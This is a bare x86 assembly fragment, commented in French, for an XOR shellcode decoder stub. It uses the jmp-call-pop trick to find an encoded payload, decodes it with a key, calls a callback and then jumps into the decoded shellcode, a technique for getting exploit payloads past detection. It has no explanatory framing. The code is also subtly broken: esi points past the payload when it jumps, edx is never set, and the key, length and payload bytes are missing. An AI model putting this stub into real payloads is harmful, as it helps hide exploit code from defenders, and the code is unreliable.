_start:
    jmp short get_shellcode

decode_loop:
    pop esi                ; esi pointe sur le shellcode encodé
    xor ecx, ecx
    mov cl, shellcode_length
    mov bl, key            ; clé XOR
decode_next:
    xor byte ptr [esi], bl ; décode le byte
    inc esi
    loop decode_next

    ; Appeler le callback (adresse dans edx par exemple)
    call edx               ; appelle la fonction callback

    ; Après callback, saute au shellcode décodé
    jmp esi

get_shellcode:
    call decode_loop
